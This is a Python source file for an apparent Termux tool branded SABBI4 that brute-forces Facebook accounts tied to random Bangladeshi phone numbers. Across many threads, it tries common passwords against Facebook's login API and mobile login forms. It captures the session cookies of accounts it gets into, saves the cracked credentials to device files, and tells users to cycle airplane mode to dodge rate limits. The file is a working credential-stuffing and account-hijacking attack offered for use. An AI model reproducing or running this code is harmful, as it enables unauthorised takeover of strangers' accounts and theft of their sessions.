                                android_version=str(random.randrange(6,13))
                                ua_string = 'Dalvik/2.1.0 (Linux; U; Android 5; S Build/QP1A.846251.613) [FBAN/FB4A;FBAV/384.0.0.7.54;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                                head = {'User-Agent': ua_string,
                                        'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        dek(f'\r\r\033[1;35m [\033[1;37mSABBI4-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas))
                                        open('/sdcard/SABBI4-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in hdcp:
                                                dek(f'\r\r\033[1;35m [\033[1;37mSABBI4-CP\033[1;35m]\x1b[1;90m '+ids+' \033[1;37m| \x1b[1;90m'+pas+'\033[1;97m')
                                                open('/sdcard/SABBI4-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/SABBI4-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass



#====================RANDOM===============
def xxggx():
	os.system('clear')
	dek(logo)
	dek("  [1] 6 DIGIT CLONING\n  [2] 7 DIGIT CLONING \n  [3] 8 DIGIT CLONING \n  [4] 11 DIGIT CLONING\n  [5] MIX CLONING \n  [6] EXIT");tln()
	dzxx = input(f"  [✓] CHOICE: ")
	if dzxx in ["1", "01","11","Q","a"]:
		digit6()
	elif dzxx in ["2", "02","22","2","b"]:
		digit7()
	elif dzxx in ["3", "03","33","3","c"]:
		digit8()
	elif dzxx in ["4", "04","44","4","d"]:
		digit11()
	elif dzxx in ["5", "05","55","5","e"]:
		mix()
	elif dzxx in ["6", "06","66","6","x"]:
		Main()
	else:
		()



def digit8():
                user=[]
                os.system('clear')
                print (logo)
                print ('\033[1;37m BD CODES : 016,017,018,019,013 \033[0;97m')
                print(40*"=")
                code = input('\033[1;37m [?] How many numbers do you want to add : ')
                os.system('clear'); print(logo)
                try:
                        limit = int(input(f'\033[1;37m  EXAMPLE: 2000, 3000, 5000, 10000\n{40*"="}\n\033[1;37m  [?] How many numbers do you want to add : '))
                        print(40*"=")
                        print("  [\x1b[1;96m+\x1b[1;97m] Do you went show cookie? (Y/N)")
                        print(40*"=")
                        SABBI4x = input("  [\x1b[1;96m+\x1b[1;97m] Choose :- ")
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as manshera:     
                        os.system('clear')
                        print (logo)
                        tl = str(len(user))
                        print('  TOTAL ID :\033[1;92m '+tl)
                        print ('  \033[1;97mSIM CODE: \033[1;92m'+code)
                        print(' \033[1;37m THE PROCESS HAS BEEN STARTED')
                        print(' \033[1;37m USE AEROPLANE MOOD IN EVERY 5 MIN ')
                        print(40*"=")
                        for psx in user:
                                uid = code+psx
                                pwx = [psx,uid,'bangladesh','556677','112255','112244']
                                if SABBI4x in ["1", "01","11","A","a","y","Y","YY","yy"]:
                                    manshera.submit(M1,uid,pwx,tl)
                                elif SABBI4x in ["2", "02","22","B","b","N","n","NN","nn"]:
                                       manshera.submit(M2,uid,pwx,tl)
                                else:
                                    manshera.submit(M3,uid,pwx,tl)

def digit6():
    user=[]
    os.system("clear")
    print (logo)
    print ('\033[1;37m BD CODES : 016,017,018,019,013 \033[0;97m')
    print(40*"=")
    code = input(' CHOOSE : ')
    os.system("clear")
    print (logo)
    print ("  EXAMPLE : 1000, 2000, 5000, 10000")
    print(40*"=")
    limit = int(input('[?] How many numbers do you want to add : '))
    os.system('clear');print(logo);print("  [\x1b[1;96m+\x1b[1;97m] Do you went show cookie? (y/n)");tln()
    SABBI4x = input("  [+] Choose :- ")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with tred(max_workers=80) as manshera:    
        os.system("clear")
        print (logo)
        tl = str(len(user))
        print(' TOTAL ID :\033[1;92m '+tl)
        print (' \033[1;97mSIM CODE: \033[1;92m'+code)
        print('\033[1;37m THE PROCESS HAS BEEN STARTED')
        print('\033[1;37m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(40*"=")
        for love in user:
            uid = code+love
            pwx = [code+love,'bangladesh','112244','112255','556677'[5:]]
            if SABBI4x in ["1", "01","12","N","n"]:
                manshera.submit(M1,uid,pwx,tl)
            elif SABBI4x in ["2", "02","22","Y","y"]:
                 manshera.submit(M2,uid,pwx,tl)
            else:
                 manshera.submit(M3,uid,pwx,tl)
def digit7():
    user=[]
    os.system("clear")
    print (logo)
    print ('\033[1;37m BD CODES : 016,017,018,019,013 \033[0;97m')
    print(40*"=")
    code = input(' CHOOSE : ')
    os.system("clear")
    print (logo)
    print ("  EXAMPLE : 1000, 2000, 5000, 10000")
    print(40*"=")
    limit = int(input('[?] How many numbers do you want to add : '))
    os.system('clear');print(logo);print("  [\x1b[1;96m+\x1b[1;97m] Do you went show cookie? (y/n)");tln()
    SABBI4x = input("  [+] Choose :- ")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=50) as manshera:    
        os.system("clear")
        print (logo)
        tl = str(len(user))
        print(' TOTAL ID :\033[1;92m '+tl)
        print (' \033[1;97mSIM CODE: \033[1;92m'+code)
        print('\033[1;37m THE PROCESS HAS BEEN STARTED')
        print('\033[1;37m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(40*"=")
        for love in user:
            uid = code+love
            pwx = [code+love,'bangladesh','556677','112255','112244'[5:]]
            if SABBI4x in ["1", "01","12","N","n"]:
                manshera.submit(M1,uid,pwx,tl)
            elif SABBI4x in ["2", "02","22","Y","y"]:
                 manshera.submit(M2,uid,pwx,tl)
            else:
                 manshera.submit(M3,uid,pwx,tl)
def digit11():
    user=[]
    os.system("clear")
    print (logo)
    print ('\033[1;37m BD CODES : 016,017,018,019,013 \033[0;97m')
    print(40*"=")
    code = input(' CHOOSE : ')
    os.system("clear")
    print (logo)
    print ("  EXAMPLE : 1000, 2000, 5000, 10000")
    print(40*"=")
    limit = int(input('[?] How many numbers do you want to add : '))
    os.system('clear');print(logo);print("  [\x1b[1;96m+\x1b[1;97m] Do you went show cookie? (y/n)");tln()
    SABBI4x = input("  [+] Choose :- ")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=80) as manshera:    
        os.system("clear")
        print (logo)
        tl = str(len(user))
        print(' TOTAL ID :\033[1;92m '+tl)
        print (' \033[1;97mSIM CODE: \033[1;92m'+code)
        print('\033[1;37m THE PROCESS HAS BEEN STARTED')
        print('\033[1;37m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(40*"=")
        for love in user:
            uid = code+love
            pwx = [code+love,'bangladesh','112244','112255','556677'[5:]]
            if SABBI4x in ["1", "01","12","N","n"]:
                manshera.submit(M1,uid,pwx,tl)
            elif SABBI4x in ["2", "02","22","Y","y"]:
                 manshera.submit(M2,uid,pwx,tl)
            else:
                 manshera.submit(M3,uid,pwx,tl)

def mix():
    user=[]
    os.system('clear')
    print(logo)
    print ('\033[1;37m BD CODES : 016,017,018,019,013 \033[0;97m')
    print(40*"=")
    kode = input('[?] How many numbers do you want to add : ')
    os.system('clear')
    print(logo)
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' Facebook CLONING (BD number) '
    print ("  EXAMPLE : 1000, 2000, 5000, 10000")
    print(40*"=")
    limit = int(input('  [?] How many numbers do you want to add : '))
    os.system('clear')
    print(logo)
    print("  [\x1b[1;96m+\x1b[1;97m] Do you went show cookie? (y/n)")
    print(40*"=")
    SABBI4x = input("  [\x1b[1;96m+\x1b[1;97m] Choose :- ")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with tred(max_workers=30) as manshera:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('  TOTAL ID :\033[1;92m '+tl)
        print (' \033[1;97m SIM CODE: \033[1;92m'+kode)
        print('\033[1;37m  THE PROCESS HAS BEEN STARTED')
        print('\033[1;37m  USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(40*"=")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','556677','112255','112244']
            if SABBI4x in ["1", "01","11","A","a","y","Y","YY","yy"]:
                manshera.submit(M1,uid,pwx,tl)
            elif SABBI4x in ["2", "02","22","B","b","N","n","NN","nn"]:
                 manshera.submit(M2,uid,pwx,tl)
            else:
                 manshera.submit(M3,uid,pwx,tl)
#==========================================


def M1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path':'/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(' \033[1;35m[\033[1;37mSABBI4-OK\033[1;35m]\033[1;32m '+uid+' \033[1;37m| \033[1;32m'+ps+'\033[0;97m \n''\033[1;37m[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;96m'+coki+'\n')
                cek_apk(session,coki)
                open('/sdcard/SABBI4-0X-OK.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \033[1;35m[\033[1;37mSABBI4-CP\033[1;35m]\033[1;31m '+uid+' \033[1;37m| \033[1;31m'+ps+'\033[0;97m')
                open('/sdcard/SABBI4-0X-CP.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m [SABBI4] %s | [OK:-%s]\r\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass


def M2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
            'method': 'GET',
            'path':'/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(' \033[1;35m[\033[1;37mSABBI4-OK\033[1;35m]\033[1;32m '+uid+' \033[1;37m| \033[1;32m'+ps+'\033[0;97m \n''\033[1;37m[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;96m'+coki+'\n')
                cek_apk(session,coki)
                open('/sdcard/SABBI4-0X-OK.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \033[1;35m[\033[1;37mSABBI4-CP\033[1;35m]\033[1;31m '+uid+' \033[1;37m| \033[1;31m'+ps+'\033[0;97m')
                open('/sdcard/SABBI4-0X-CP.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m [SABBI4] %s | [OK:-%s]\r\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass

def M3(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {'authority': 'mbasic.facebook.com',
                        'method': 'GET',
                        'path':'/',
                        'scheme': 'https',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                        'cache-control': 'max-age=0',
                     # 'cookie': 'datr=x0BuZKQbk-c4-k_9O9IddDRV; sb=x0BuZGssIiQ_uDcjNxt4-we-',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                        'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-ch-ua-platform-version': '"11.0.0"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(' \033[1;35m[\033[1;37mSABBI4-OK\033[1;35m]\033[1;32m '+uid+' \033[1;37m| \033[1;32m'+ps+'\033[0;97m \n''\033[1;37m[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;96m'+coki+'\n')
                cek_apk(session,coki)
                open('/sdcard/SABBI4-0X-OK.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m [SABBI4] %s | [OK:-%s]\r\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass

#====================DUMP===============



logo1 = (f"""\t\033[38;5;46m╔══════════════════════════════════╗
\t\033[38;5;46m║\033[38;5;46mSA    SA \33[38;5;196mSABBI4 \033[34;1mSA    SA  \033[38;5;46mSABBI4SA    ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA   SA   \33[38;5;196mSA  \033[34;1mSA#   SA \033[38;5;46mSA    SA   ║\033[38;5;46m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA  SA    \33[38;5;196mSA  \033[34;1mSABBI4  SA \033[38;5;46mSA         ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSABBI4#     \33[38;5;196mSA  \033[34;1mSA SA SA \033[38;5;46mSA   SABBI4  ║\033[38;5;46m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA  SA    \33[38;5;196mSA  \033[34;1mSA  SABBI4 \033[38;5;46mSA    SA   ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA   SA   \33[38;5;196mSA  \033[34;1mSA   SA# \033[38;5;46mSA    SA   ║\033[38;5;46m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA    SA \33[38;5;196mSABBI4 \033[34;1mSA    SA  \033[38;5;46mSABBI4SA    ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m╚══════════════════════════════════╝
               \033[34;1m𝗪𝗜𝗙𝗜 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦💥💥
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mSABBI4\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]SABBI4\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]SABBI4\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★]SABBI4-𝗧𝗘𝗥𝗠𝗨𝗫\33[38;5;196m       ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+𝟴𝟴𝟬𝟭304683013\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : [★]𝗥𝟰𝗡𝗗𝗢𝗠-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]𝗩A4SON-1.1\33[38;5;196m         ┃
 \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝗞𝗜𝗡𝗚\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""")
        


#============================================
Main()
